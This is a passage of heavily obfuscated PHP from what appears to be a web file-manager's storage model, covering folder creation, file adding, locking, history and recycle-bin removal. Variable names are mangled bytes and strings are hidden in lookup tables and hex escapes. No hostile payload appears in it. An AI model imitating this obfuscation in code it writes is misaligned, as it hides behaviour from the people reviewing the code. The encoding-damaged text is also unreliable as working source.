$Õ—“¿ÊŠ[$•Œ³ó¾Í[88]] = array($•Œ³ó¾Í[2284], $ŞÊõ¬Ê[$•Œ³ó¾Í[851]]); } if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[852]]) && $ŞÊõ¬Ê[$•Œ³ó¾Í[852]]) { $ışÊ´¡è = array($•Œ³ó¾Í[2285], $ŞÊõ¬Ê[$•Œ³ó¾Í[852]]); if ($Õ—“¿ÊŠ[$•Œ³ó¾Í[88]]) { $Õ—“¿ÊŠ[$•Œ³ó¾Í[88]] = array($Õ—“¿ÊŠ[$•Œ³ó¾Í[88]], $ışÊ´¡è, $•Œ³ó¾Í[2286]); } else { $Õ—“¿ÊŠ[$•Œ³ó¾Í[88]] = $ışÊ´¡è; } } if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[2278]]) && $ŞÊõ¬Ê[$•Œ³ó¾Í[2278]] > 0) { $Õ—“¿ÊŠ[$•Œ³ó¾Í[79]] = array($•Œ³ó¾Í[2284], $ŞÊõ¬Ê[$•Œ³ó¾Í[2278]]); } if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[2279]]) && $ŞÊõ¬Ê[$•Œ³ó¾Í[2279]]) { $ışÊ´¡è = array($•Œ³ó¾Í[2285], $ŞÊõ¬Ê[$•Œ³ó¾Í[2279]]); if ($Õ—“¿ÊŠ[$•Œ³ó¾Í[79]]) { $Õ—“¿ÊŠ[$•Œ³ó¾Í[79]] = array($Õ—“¿ÊŠ[$•Œ³ó¾Í[79]], $ışÊ´¡è, $•Œ³ó¾Í[2286]); } else { $Õ—“¿ÊŠ[$•Œ³ó¾Í[79]] = $ışÊ´¡è; } } if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[670]]) && $ŞÊõ¬Ê[$•Œ³ó¾Í[670]]) { $Õ—“¿ÊŠ[] = array($•Œ³ó¾Í[532] => $ŞÊõ¬Ê[$•Œ³ó¾Í[670]], $•Œ³ó¾Í[530] => $ŞÊõ¬Ê[$•Œ³ó¾Í[670]], $•Œ³ó¾Í[1104] => $•Œ³ó¾Í[2109]); } if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[489]]) && $ŞÊõ¬Ê[$•Œ³ó¾Í[489]]) { $â‹šæš— = $ŞÊõ¬Ê[$•Œ³ó¾Í[489]]; if ($â‹šæš— == $•Œ³ó¾Í[78]) { $Õ—“¿ÊŠ[$•Œ³ó¾Í[488]] = 1; } else { if ($â‹šæš— == $•Œ³ó¾Í[2287]) { $Õ—“¿ÊŠ[$•Œ³ó¾Í[488]] = 0; } else { if ($â‹šæš—) { $â‹šæš— = is_array($â‹šæš—) ? $â‹šæš— : explode($•Œ³ó¾Í[50], $â‹šæš—); $Õ—“¿ÊŠ[$•Œ³ó¾Í[489]] = array($•Œ³ó¾Í[495], $â‹šæš—); $Õ—“¿ÊŠ[$•Œ³ó¾Í[488]] = 0; } } } } $this->_parseSearchParent($ŞÊõ¬Ê, $Õ—“¿ÊŠ); if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[2105]]) && trim($ŞÊõ¬Ê[$•Œ³ó¾Í[2105]])) { $‰£Õ¥êË = trim($ŞÊõ¬Ê[$•Œ³ó¾Í[2105]]); $ÀÉÙÓ½ê = explode($•Œ³ó¾Í[53], $‰£Õ¥êË); if (strlen($‰£Õ¥êË) > 2 && (substr($‰£Õ¥êË, 0, 1) == $•Œ³ó¾Í[121] && substr($‰£Õ¥êË, -1) == $•Œ³ó¾Í[121]) || substr($‰£Õ¥êË, 0, 1) == $•Œ³ó¾Í[58] && substr($‰£Õ¥êË, -1) == $•Œ³ó¾Í[58]) { $‰£Õ¥êË = substr($‰£Õ¥êË, 1, -1); $ÀÉÙÓ½ê = array($‰£Õ¥êË); } $Õ—“¿ÊŠ[$•Œ³ó¾Í[32]] = array(array($•Œ³ó¾Í[620], $•Œ³ó¾Í[2107] . $‰£Õ¥êË . $•Œ³ó¾Í[2107])); if (count($ÀÉÙÓ½ê) > 1) { $Õ—“¿ÊŠ[$•Œ³ó¾Í[32]] = array(); foreach ($ÀÉÙÓ½ê as $Ñô„¿ë) { if (!trim($Ñô„¿ë)) { continue; } $Õ—“¿ÊŠ[$•Œ³ó¾Í[32]][] = array($•Œ³ó¾Í[620], $•Œ³ó¾Í[2107] . trim($Ñô„¿ë) . $•Œ³ó¾Í[2107]); } } } return $Õ—“¿ÊŠ; } private function _parseSearchParent($ÇÉåì•÷, &$êöğ¦¬) { $¤´¥ğŠ =& $_SERVER[ÓïÕü]; if (!isset($ÇÉåì•÷[$¤´¥ğŠ[193]]) || !$ÇÉåì•÷[$¤´¥ğŠ[193]]) { return; } $öˆü ÙÚ = $this->pathInfo($ÇÉåì•÷[$¤´¥ğŠ[193]]); $§¼¦Äş‡ = $öˆü ÙÚ[$¤´¥ğŠ[193]] . $¤´¥ğŠ[12] === $¤´¥ğŠ[231]; $õó™£ÉÈ = $öˆü ÙÚ[$¤´¥ğŠ[191]] == $¤´¥ğŠ[583]; if ($öˆü ÙÚ[$¤´¥ğŠ[599]] == $¤´¥ğŠ[600]) { $µ”ìŠ‚ = $this->sourceInfo($ÇÉåì•÷[$¤´¥ğŠ[193]]); $öˆü ÙÚ[$¤´¥ğŠ[589]] = $µ”ìŠ‚[$¤´¥ğŠ[589]]; } $êöğ¦¬[$¤´¥ğŠ[660]] = array($¤´¥ğŠ[620], $öˆü ÙÚ[$¤´¥ğŠ[589]] . $ÇÉåì•÷[$¤´¥ğŠ[193]] . $¤´¥ğŠ[621]); $Ô¿«öª¢ = isset($ÇÉåì•÷[$¤´¥ğŠ[1965]]) && in_array($¤´¥ğŠ[583], $ÇÉåì•÷[$¤´¥ğŠ[1965]]); if (!$Ô¿«öª¢ || !$õó™£ÉÈ || !$§¼¦Äş‡ || !$öˆü ÙÚ[$¤´¥ğŠ[490]]) { return; } if (!AuthModel::authCheckRoot($öˆü ÙÚ[$¤´¥ğŠ[490]][$¤´¥ğŠ[491]])) { return; } $Ì´›¬£Ş = $öˆü ÙÚ[$¤´¥ğŠ[574]] . $¤´¥ğŠ[12]; if ($Ì´›¬£Ş == $¤´¥ğŠ[91]) { unset($êöğ¦¬[$¤´¥ğŠ[660]]); $êöğ¦¬[$¤´¥ğŠ[191]] = self::TYPE_GROUP; return; } $ÇË›¢ = Model($¤´¥ğŠ[590])->groupChildrenAll($Ì´›¬£Ş); $Ú†ÒØ¾Á = count($ÇË›¢); if ($Ú†ÒØ¾Á <= 1) { return; } $¬Òğ¥“Ê = array($¤´¥ğŠ[193] => 0, $¤´¥ğŠ[191] => self::TYPE_GROUP, $¤´¥ğŠ[574] => array($¤´¥ğŠ[7], $ÇË›¢)); $Ø©ªÖâ‘ = $this->field($¤´¥ğŠ[2288])->where($¬Òğ¥“Ê)->limit($Ú†ÒØ¾Á)->select(); $êöğ¦¬[$¤´¥ğŠ[660]] = array(); foreach ($Ø©ªÖâ‘ as $„‚—å×Ç) { $êöğ¦¬[$¤´¥ğŠ[660]][] = array($¤´¥ğŠ[620], $¤´¥ğŠ[598] . $„‚—å×Ç[$¤´¥ğŠ[194]] . $¤´¥ğŠ[621]); } $êöğ¦¬[$¤´¥ğŠ[660]][] = $¤´¥ğŠ[2109]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($İ×Ôôµœ) { $ê¢Ÿ›®­ =& $_SERVER[ÓïÕü]; $è¶¬¢³ş = Model($ê¢Ÿ›®­[582])->where(array($ê¢Ÿ›®­[1797] => $İ×Ôôµœ))->find(); $ö¤¢Ö…µ = $this->_mkdirRoot(SourceModel::TYPE_USER, $İ×Ôôµœ, $è¶¬¢³ş[$ê¢Ÿ›®­[32]]); $this->userDesktopAdd($ö¤¢Ö…µ); return $ö¤¢Ö…µ; } public function userDesktopAdd($ÅŠ§»š) { $íœæ±Ú¦ =& $_SERVER[ÓïÕü]; $åñÓÙÈú = LNG($íœæ±Ú¦[2289]); $–İËï = $this->mkdir($ÅŠ§»š, $åñÓÙÈú); $this->metaSet($–İËï, $íœæ±Ú¦[2290], $íœæ±Ú¦[91]); $this->metaSet($ÅŠ§»š, $íœæ±Ú¦[2291], $–İËï); } public function userPathSafeAdd($¦ºàøØ¼) { $Ï·–ù¨Ú =& $_SERVER[ÓïÕü]; $ÃÅ·Íõ­ = Model($Ï·–ù¨Ú[582])->getInfoFull($¦ºàøØ¼); if (!$ÃÅ·Íõ­) { return !1; } if (_get($ÃÅ·Íõ­, $Ï·–ù¨Ú[603])) { return $ÃÅ·Íõ­[$Ï·–ù¨Ú[544]][$Ï·–ù¨Ú[2292]]; } $³ø“Ú² = $this->_mkdirRoot(SourceModel::TYPE_USER, $¦ºàøØ¼, $Ï·–ù¨Ú[2293], $Ï·–ù¨Ú[2294]); Model($Ï·–ù¨Ú[582])->metaSet($¦ºàøØ¼, $Ï·–ù¨Ú[2292], $³ø“Ú²); $this->metaSet($³ø“Ú², $Ï·–ù¨Ú[2295], $¦ºàøØ¼); return $³ø“Ú²; } public function userPathAppAdd($¾ÖåÏƒ, $ñÆÚ—Ë— = '', $ôÇÅ°´Ë = '') { $š¶·ıÑ =& $_SERVER[ÓïÕü]; $ß ùÈ©ô = Model($š¶·ıÑ[582])->getInfoFull($¾ÖåÏƒ); if (!$ß ùÈ©ô) { return !1; } $ûËÈ‹Á† = $ß ùÈ©ô[$š¶·ıÑ[544]] ? $ß ùÈ©ô[$š¶·ıÑ[544]] : array(); $Åä½œ›š = $ûËÈ‹Á†[$š¶·ıÑ[2296]]; if (!$Åä½œ›š) { $Åä½œ›š = $this->_mkdirRoot(SourceModel::TYPE_USER, $¾ÖåÏƒ, $š¶·ıÑ[2297], $š¶·ıÑ[2298]); Model($š¶·ıÑ[582])->metaSet($¾ÖåÏƒ, $š¶·ıÑ[2296], $Åä½œ›š . $š¶·ıÑ[12]); $this->metaSet($Åä½œ›š, $š¶·ıÑ[2296], $¾ÖåÏƒ); } if (!$ñÆÚ—Ë—) { return $Åä½œ›š; } $¡ë³³Ó´ = $ûËÈ‹Á†[$š¶·ıÑ[2299] . $ñÆÚ—Ë—]; if (!$¡ë³³Ó´) { $¡ë³³Ó´ = $this->mkdir($Åä½œ›š, $ñÆÚ—Ë—); Model($š¶·ıÑ[582])->metaSet($¾ÖåÏƒ, $š¶·ıÑ[2299] . $ñÆÚ—Ë—, $¡ë³³Ó´); $this->metaSet($¡ë³³Ó´, $š¶·ıÑ[2299] . $ñÆÚ—Ë—, $¾ÖåÏƒ); } if (!$ôÇÅ°´Ë) { return $¡ë³³Ó´; } $Â¡²É¨ = $this->mkdir($¡ë³³Ó´, $ôÇÅ°´Ë); return $Â¡²É¨; } public function groupRootAdd($ŒÔê§‰ó) { $¶ÔÖà› =& $_SERVER[ÓïÕü]; $ ´ë»˜Ş = Model($¶ÔÖà›[590])->where(array($¶ÔÖà›[2096] => $ŒÔê§‰ó))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ŒÔê§‰ó, $ ´ë»˜Ş[$¶ÔÖà›[32]]); } public function systemRootPathAdd($Œ¡ëÇ”ş) { if ($Œ¡ëÇ”ş != $_SERVER[ÓïÕü][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Œ¡ëÇ”ş); } public function userRootRemove($åÄÏ  ) { $œÑˆ¹¢ = $this->targetSourceRoot(SourceModel::TYPE_USER, $åÄÏ  , !0); foreach ($œÑˆ¹¢ as $ªĞÛ¿‚¿) { if (!$ªĞÛ¿‚¿) { continue; } $this->remove($ªĞÛ¿‚¿[$_SERVER[ÓïÕü][194]], !1); } } public function groupRootRemove($€‰ÔÄ Ä) { $Å‚•¡Ö‚ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $€‰ÔÄ Ä); if (!$Å‚•¡Ö‚) { return; } $this->remove($Å‚•¡Ö‚[$_SERVER[ÓïÕü][194]], !1); } private function _mkdirRoot($Û½€ßµ†, $©µ×šö, $ÏÜ§ê””, $è²–×Ù = '') { $×İÊş¸ =& $_SERVER[ÓïÕü]; $Š÷ª÷Òè = defined($×İÊş¸[2234]) ? USER_ID : 0; $Çû¿š¤í = array($×İÊş¸[480] => 0, $×İÊş¸[656] => $Û½€ßµ†, $×İÊş¸[657] => $©µ×šö, $×İÊş¸[654] => 1, $×İÊş¸[658] => $Š÷ª÷Òè, $×İÊş¸[659] => $Š÷ª÷Òè, $×İÊş¸[655] => $è²–×Ù, $×İÊş¸[660] => $×İÊş¸[598], $×İÊş¸[507] => 0, $×İÊş¸[625] => 0, $×İÊş¸[547] => 0, $×İÊş¸[661] => $×İÊş¸[12]); if ($ïÅÎ–ğÑ = $this->where($Çû¿š¤í)->find()) { return $ïÅÎ–ğÑ[$×İÊş¸[194]]; } $·å¤ÃİÀ = "\x4d\x6f\x64\145\154\123\157\x75\x72\143\145\56\155\x6b\x64\151\x72\x52\x6f\x6f\x74\x2e{$Û½€ßµ†}\x2e{$©µ×šö}\x2e" . $ÏÜ§ê””; CacheLock::lock($·å¤ÃİÀ); $Çû¿š¤í[$×İÊş¸[32]] = $ÏÜ§ê””; $Éıı†Çµ = $this->add($Çû¿š¤í); $ÎÖµ¸åı = array($×İÊş¸[662] => short_id($Éıı†Çµ)); $this->where(array($×İÊş¸[494] => $Éıı†Çµ))->save($ÎÖµ¸åı); CacheLock::unlock($·å¤ÃİÀ); return $Éıı†Çµ; } private function targetSourceRoot($ãİ°òß³, $ÈˆÆ¸Â, $ÀÙÜ©â“ = false) { $¯ñÓÚõ­ =& $_SERVER[ÓïÕü]; $¯—è¤Ú = array($¯ñÓÚõ­[480] => 0, $¯ñÓÚõ­[656] => $ãİ°òß³, $¯ñÓÚõ­[657] => $ÈˆÆ¸Â); if ($ÀÙÜ©â“) { $ÊÈ‡Ò¼ = $this->where($¯—è¤Ú)->select(); return $ÊÈ‡Ò¼ ? $ÊÈ‡Ò¼ : array(); } $ĞçÊ­âŸ = $this->where($¯—è¤Ú)->find(); return $ĞçÊ­âŸ ? $ĞçÊ­âŸ : array(); } public function sourceRootGroup($¤ñ˜»¡) { $øš€àÆ =& $_SERVER[ÓïÕü]; if (is_string($¤ñ˜»¡)) { $¤ñ˜»¡ = array($¤ñ˜»¡); } $ş¼ª›»„ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¤ñ˜»¡, $øš€àÆ[223]); $áÄÅ·¯ = array($øš€àÆ[448] => $ş¼ª›»„, $øš€àÆ[445] => array($øš€àÆ[849] => count($¤ñ˜»¡))); $this->_listDataApply($áÄÅ·¯[$øš€àÆ[448]]); $this->_listMake($áÄÅ·¯); return array_to_keyvalue($áÄÅ·¯[$øš€àÆ[85]], $øš€àÆ[574]); } public function mkfile($†„‘ç¸Ò, $¤É¹Ó×³, $Åå”¿£Ò = '', $ÍÈ§¡˜Æ = REPEAT_RENAME) { $“ùÀæÒÊ =& $_SERVER[ÓïÕü]; $øÈá–¢š = KodIO::ioFileDriverGet($“ùÀæÒÊ[486] . $†„‘ç¸Ò . $“ùÀæÒÊ[405]); $² ø «¾ = Model($“ùÀæÒÊ[682])->addFileByContent($Åå”¿£Ò, $øÈá–¢š, $¤É¹Ó×³); return $this->_createFileCall($†„‘ç¸Ò, $¤É¹Ó×³, $² ø «¾, $ÍÈ§¡˜Æ, $“ùÀæÒÊ[1466]); } public function addFile($Ùş¿’Æñ, $™¦®Ş², $˜Ëã¬¥³, $Ô¡âó¡¸ = false, $·¨óû¢Ü = REPEAT_RENAME) { $½çÑè¬ó =& $_SERVER[ÓïÕü]; $÷È‡¹ªê = KodIO::ioFileDriverGet($½çÑè¬ó[486] . $Ùş¿’Æñ . $½çÑè¬ó[405]); $£¶÷Ê–ï = Model($½çÑè¬ó[682])->addFile($™¦®Ş², $÷È‡¹ªê, $˜Ëã¬¥³, $Ô¡âó¡¸); return $this->_createFileCall($Ùş¿’Æñ, $˜Ëã¬¥³, $£¶÷Ê–ï, $·¨óû¢Ü); } public function addFileByFileID($ˆ†öÒ–ş, $³’¶Ø»ä, $Ñ÷Äá¨, $©šÓÆŠ‚ = REPEAT_RENAME) { $•¼É›œ =& $_SERVER[ÓïÕü]; $½ìô³ıÏ = Model($•¼É›œ[682])->find($³’¶Ø»ä); Model($•¼É›œ[682])->linkAdd($³’¶Ø»ä); return $this->_createFileCall($ˆ†öÒ–ş, $Ñ÷Äá¨, $½ìô³ıÏ, $©šÓÆŠ‚); } public function addFileByRemote($ù‚ÅŸüò, $¡ÄÓª€ƒ, $Şª Û¿¤, $£Š†¶µ™ = array(), $µñ âüå = REPEAT_RENAME) { $»ÏÈôğ« = Model($_SERVER[ÓïÕü][682])->addFileByRemote($¡ÄÓª€ƒ, $Şª Û¿¤, $£Š†¶µ™); return $this->_createFileCall($ù‚ÅŸüò, $Şª Û¿¤, $»ÏÈôğ«, $µñ âüå); } private function _createFileCall($Ã¢Ì±µˆ, $æ€ÄÊó, $ÛÃÉë, $óÔº„Õ¡, $¿äòÔàñ = "\165\160\154\x6f\141\x64") { $—½šÚ ¦ =& $_SERVER[ÓïÕü]; if (!$ÛÃÉë) { return !1; } $ÚÍ‚ÖÎú = !1; $this->setMasterDB(); $this->lockWriteStart($Ã¢Ì±µˆ, $æ€ÄÊó); $ÈÑ×ïÓË = $this->fileNameExist($Ã¢Ì±µˆ, $æ€ÄÊó); $ÖÀøãí = $this->_createFile($Ã¢Ì±µˆ, $æ€ÄÊó, $ÛÃÉë, $óÔº„Õ¡, $ÚÍ‚ÖÎú); if (!$ÚÍ‚ÖÎú) { Model($—½šÚ ¦[549])->remove($ÛÃÉë[$—½šÚ ¦[546]]); } if ($ÚÍ‚ÖÎú && $ÖÀøãí && $ÖÀøãí != $ÈÑ×ïÓË) { Model($—½šÚ ¦[2261])->eventCreate($ÖÀøãí, $¿äòÔàñ); } $this->lockWriteEnd($Ã¢Ì±µˆ, $æ€ÄÊó); return $ÖÀøãí; } public function mkdir($œ’…ÄÄ, $¬èĞ“Ü˜, $ìÃÉÉ”ò = REPEAT_SKIP) { $Ï¡Ó¢ =& $_SERVER[ÓïÕü]; $this->setMasterDB(); $ôŸ­‡àî = $this->sourceInfo($œ’…ÄÄ); if (!$ôŸ­‡àî) { return !1; } $this->lockWriteStart($œ’…ÄÄ, $¬èĞ“Ü˜); if ($ìÃÉÉ”ò !== !1) { $ÀˆÌ™’Ï = $this->fileNameExist($œ’…ÄÄ, $¬èĞ“Ü˜); if ($ÀˆÌ™’Ï && $ìÃÉÉ”ò != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($œ’…ÄÄ, $¬èĞ“Ü˜); return $ÀˆÌ™’Ï; } $¬èĞ“Ü˜ = $this->fileNameAuto($œ’…ÄÄ, $¬èĞ“Ü˜, $ìÃÉÉ”ò); } $ê¿â´€Ï = array($Ï¡Ó¢[654] => 1, $Ï¡Ó¢[497] => $¬èĞ“Ü˜, $Ï¡Ó¢[655] => $Ï¡Ó¢[12], $Ï¡Ó¢[547] => 0, $Ï¡Ó¢[625] => 0); $ò®ò´€Ï = $this->_addSource($ê¿â´€Ï, $ôŸ­‡àî); Model($Ï¡Ó¢[2261])->eventCreate($ò®ò´€Ï, $Ï¡Ó¢[1467]); $this->lockWriteEnd($œ’…ÄÄ, $¬èĞ“Ü˜); return $ò®ò´€Ï; } public function listSourceRoot($‘ÁÒ¯ôã, $™ûèòò´, $¾êîÓı = "\163\x6f\165\162\143\145\x49\x44\54\164\141\162\x67\145\164\x49\104\54\x73\151\172\x65") { $”ÚË³ïú =& $_SERVER[ÓïÕü]; $ºÓ¥„‰Í = $”ÚË³ïú[457]; $¯Åôæá = array(); $¥¥áŞ½„ = 1024 * 50; $Ïôõšû‡ = is_array($Ïôõšû‡) ? $Ïôõšû‡ : array(); $÷³Êì´Õ = count($™ûèòò´); $Æää‹‹ = $this->tablePrefix . $”ÚË³ïú[2300]; for ($ÇÑÜÒ¹· = 0; $ÇÑÜÒ¹· < $÷³Êì´Õ; $ÇÑÜÒ¹·++) { $ïÆığ´œ = $™ûèòò´[$ÇÑÜÒ¹·]; $ºÓ¥„‰Í .= "\123\x45\114\x45\103\x54\40\x2a\x20\106\122\x4f\x4d\x20\50\x53\x45\x4c\105\x43\124\x20{$¾êîÓı}\x20\106\x52\x4f\x4d\x20\x60{$Æää‹‹}\140\x20\x57\x48\105\122\x45\x20"; $ºÓ¥„‰Í .= "\140\x70\141\x72\x65\156\x74\111\104\x60\75\60\40\x41\116\104\40\x60\x74\141\162\147\145\x74\111\104\x60\x3d{$ïÆığ´œ}\x20\x41\x4e\x44\x20\140\164\141\162\x67\x65\164\x54\x79\160\x65\140\x3d{$‘ÁÒ¯ôã}\40\141\156\x64\x20\146\151\154\x65\x54\x79\160\x65\75\x27\x27\x20\154\x69\155\x69\x74\40\x31\51\x20\141\x73\x20\x74\142\x5f{$ÇÑÜÒ¹·}\x20\125\116\x49\117\116\x20\x41\114\x4c\x20"; if ((strlen($ºÓ¥„‰Í) >= $¥¥áŞ½„ || $ÇÑÜÒ¹· == $÷³Êì´Õ - 1) && $ºÓ¥„‰Í) { $ºÓ¥„‰Í = substr($ºÓ¥„‰Í, 0, -strlen($”ÚË³ïú[1142])); $Ş×û¬²Ã = $this->query($ºÓ¥„‰Í); $ºÓ¥„‰Í = $”ÚË³ïú[12]; $¯Åôæá = array_merge($¯Åôæá, $Ş×û¬²Ã); } } return $¯Åôæá; } private function _createFile($£ƒ–ØáÊ, $ñ¾¨¯°, $ğÆ¨Öİ, $Ÿ„ëèçÒ, &$è…‚¢°») { $ ¼û«ù• =& $_SERVER[ÓïÕü]; $ß¢–ëù = $this->sourceInfo($£ƒ–ØáÊ); if (!$ğÆ¨Öİ || !$ß¢–ëù) { return !1; } if ($Ÿ„ëèçÒ !== !1) { $úÍ‚›‡» = $this->fileNameExist($£ƒ–ØáÊ, $ñ¾¨¯°); } $è…‚¢°» = !0; if ($Ÿ„ëèçÒ && $úÍ‚›‡») { if ($Ÿ„ëèçÒ == REPEAT_SKIP) { $è…‚¢°» = !1; return $úÍ‚›‡»; } else { if ($Ÿ„ëèçÒ == REPEAT_REPLACE) { $Ã»ôÄ‰à = $this->sourceInfo($úÍ‚›‡»); $ˆÊãø©¶ = $this->fileHistory($Ã»ôÄ‰à, $ğÆ¨Öİ[$ ¼û«ù•[546]], $ğÆ¨Öİ[$ ¼û«ù•[79]]); if (!$ˆÊãø©¶) { $è…‚¢°» = !1; } else { $this->folderSizeReset($£ƒ–ØáÊ); } return $úÍ‚›‡»; } else { $ñ¾¨¯° = $this->fileNameAuto($£ƒ–ØáÊ, $ñ¾¨¯°, $Ÿ„ëèçÒ, !1); } } } $Ô¾¸‚ûĞ = array($ ¼û«ù•[654] => 0, $ ¼û«ù•[497] => $ñ¾¨¯°, $ ¼û«ù•[655] => substr(get_path_ext($ñ¾¨¯°), 0, 10), $ ¼û«ù•[547] => $ğÆ¨Öİ[$ ¼û«ù•[546]], $ ¼û«ù•[625] => $ğÆ¨Öİ[$ ¼û«ù•[79]]); $ú´°å¶ã = $this->_addSource($Ô¾¸‚ûĞ, $ß¢–ëù); $this->folderSizeReset($£ƒ–ØáÊ, intval($Ô¾¸‚ûĞ[$ ¼û«ù•[79]])); return $ú´°å¶ã; } protected function fileHistory($­’ÑÚŠù, $ã£İ‚, $¹ºÛşç÷) { $¢Éû¾±ó =& $_SERVER[ÓïÕü]; if ($­’ÑÚŠù[$¢Éû¾±ó[546]] == $ã£İ‚) { return !1; } $this->checkLock($­’ÑÚŠù[$¢Éû¾±ó[194]], $ã£İ‚); Model($¢Éû¾±ó[2301])->addHistory($­’ÑÚŠù); $İ³²‚¬é = array($¢Éû¾±ó[659] => USER_ID, $¢Éû¾±ó[501] => time(), $¢Éû¾±ó[546] => $ã£İ‚, $¢Éû¾±ó[79] => $¹ºÛşç÷); $this->where(array($¢Éû¾±ó[494] => $­’ÑÚŠù[$¢Éû¾±ó[194]]))->save($İ³²‚¬é); $this->sourceCacheClear($­’ÑÚŠù[$¢Éû¾±ó[194]]); return !0; } public function checkLock($ğ±æŸœ±, $Ó„ø·‹) { $ı¯·»” =& $_SERVER[ÓïÕü]; $ŠÏƒ»Ï½ = $this->pathInfo($ğ±æŸœ±); if (!$this->fileIsLock($ŠÏƒ»Ï½, !0)) { return; } $«ïÚ›şâ = Session::get($ı¯·»”[2302]); $Èí÷»…ó = substr($ŠÏƒ»Ï½[$ı¯·»”[32]], 0, -1 - strlen($ŠÏƒ»Ï½[$ı¯·»”[169]])) . $ı¯·»”[1321] . $«ïÚ›şâ . $ı¯·»”[10] . $ŠÏƒ»Ï½[$ı¯·»”[169]]; $ÎÍÀ§ìü = Model($ı¯·»”[682])->find($Ó„ø·‹); $this->_createFileCall($ŠÏƒ»Ï½[$ı¯·»”[193]], $Èí÷»…ó, $ÎÍÀ§ìü, REPEAT_REPLACE, $ı¯·»”[1466]); $²©Ó¦¼å = $ŠÏƒ»Ï½[$ı¯·»”[544]][$ı¯·»”[618]]; $â–øêÚ = $²©Ó¦¼å[$ı¯·»”[2303]] ? $²©Ó¦¼å[$ı¯·»”[2303]] : $²©Ó¦¼å[$ı¯·»”[32]]; show_json(LNG($ı¯·»”[2304]) . $ı¯·»”[2305] . LNG($ı¯·»”[2306]) . $ı¯·»”[2307] . $â–øêÚ . $ı¯·»”[2308], !1); } public function fileIsLock($Ñ£×ÛšŞ, $–“´êğ = false) { $Ü»¿»® =& $_SERVER[ÓïÕü]; if (!_get($Ñ£×ÛšŞ, $Ü»¿»®[614], 0)) { return !1; } if ($Ñ£×ÛšŞ[$Ü»¿»®[544]][$Ü»¿»®[617]] != USER_ID) { return !0; } $ë‡±ÚıÇ = $GLOBALS[$Ü»¿»®[6]][$Ü»¿»®[92]][$Ü»¿»®[615]]; if ($Ñ£×ÛšŞ[$Ü»¿»®[544]][$Ü»¿»®[616]] <= time() - $ë‡±ÚıÇ) { $this->metaSet($Ñ£×ÛšŞ[$Ü»¿»®[194]], $Ü»¿»®[617], null); $this->metaSet($Ñ£×ÛšŞ[$Ü»¿»®[194]], $Ü»¿»®[616], null); } if ($–“´êğ) { $this->metaSet($Ñ£×ÛšŞ[$Ü»¿»®[194]], $Ü»¿»®[616], time()); } return !1; } private function _addSource($ ğôüßà, $µşÚ«Ñ) { $§—É‡ò =& $_SERVER[ÓïÕü]; $½ò®ëÍÖ = defined($§—É‡ò[2234]) ? USER_ID : 0; $ÎĞıéÉº = array($§—É‡ò[656] => $µşÚ«Ñ[$§—É‡ò[191]], $§—É‡ò[657] => $µşÚ«Ñ[$§—É‡ò[574]], $§—É‡ò[658] => $½ò®ëÍÖ, $§—É‡ò[659] => $½ò®ëÍÖ, $§—É‡ò[480] => $µşÚ«Ñ[$§—É‡ò[194]], $§—É‡ò[660] => $µşÚ«Ñ[$§—É‡ò[589]] . $µşÚ«Ñ[$§—É‡ò[194]] . $§—É‡ò[50], $§—É‡ò[507] => 0, $§—É‡ò[661] => $§—É‡ò[12]); $ ğôüßà = array_merge($ÎĞıéÉº, $ ğôüßà); $this->updateModifyTime($ ğôüßà[$§—É‡ò[193]]); $Ò“öè”Í = $§—É‡ò[2309] . $µşÚ«Ñ[$§—É‡ò[194]]; if (isset(self::$cacheChildList[$Ò“öè”Í])) { unset(self::$cacheChildList[$Ò“öè”Í]); } static $­™‡ç¹¾ = false; if (!$­™‡ç¹¾) { Hook::trigger($§—É‡ò[644], $ ğôüßà); $­™‡ç¹¾ = !0; } $ ÂäÀû× = $this->add($ ğôüßà); $Ù×šÙ®Û = array($§—É‡ò[662] => short_id($ ÂäÀû×)); $this->where(array($§—É‡ò[494] => $ ÂäÀû×))->save($Ù×šÙ®Û); $this->setNamePinyin($ ÂäÀû×, $ ğôüßà[$§—É‡ò[32]]); return $ ÂäÀû×; } public function remove($÷éôí€Ç, $Ò€¿š”¸ = true) { $á›ƒù“Ì =& $_SERVER[ÓïÕü]; $·¶¡Ğ§‚ = $this->sourceInfo($÷éôí€Ç); $´ºÊšÔ = intval($·¶¡Ğ§‚[$á›ƒù“Ì[191]]) === self::TYPE_SYSTEM; $ÎèÑ·Å‘ = Model($á›ƒù“Ì[511])->get($á›ƒù“Ì[2310]) == $á›ƒù“Ì[91]; if ($´ºÊšÔ || $Ò€¿š”¸ || !$ÎèÑ·Å‘) { return $this->removeNow($÷éôí€Ç, $Ò€¿š”¸); } $ÁÀ¬ˆäå = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $œ½—»ÚŠ = $·¶¡Ğ§‚[$á›ƒù“Ì[191]] == self::TYPE_USER ? $á›ƒù“Ì[670] : $á›ƒù“Ì[583]; if ($œ½—»ÚŠ == $á›ƒù“Ì[670]) { $û²¬ñˆò = Model($á›ƒù“Ì[582])->getInfo($·¶¡Ğ§‚[$á›ƒù“Ì[574]]); $ó²Ü¶„À = !empty($û²¬ñˆò[$á›ƒù“Ì[2303]]) ? $û²¬ñˆò[$á›ƒù“Ì[2303]] : $û²¬ñˆò[$á›ƒù“Ì[32]]; $ó²Ü¶„À = $á›ƒù“Ì[340] . $ó²Ü¶„À . $á›ƒù“Ì[2311] . $·¶¡Ğ§‚[$á›ƒù“Ì[574]]; } else { $û²¬ñˆò = Model($á›ƒù“Ì[590])->getInfo($·¶¡Ğ§‚[$á›ƒù“Ì[574]]); $ó²Ü¶„À = _get($û²¬ñˆò, $á›ƒù“Ì[32]); $ó²Ü¶„À = $á›ƒù“Ì[176] . $ó²Ü¶„À . $á›ƒù“Ì[2312] . $·¶¡Ğ§‚[$á›ƒù“Ì[574]]; } $€”¥æ£Å = $á›ƒù“Ì[2313] . md5($ó²Ü¶„À); CacheLock::lock($€”¥æ£Å); $‹±±áå¼ = $this->fileNameExist($ÁÀ¬ˆäå, 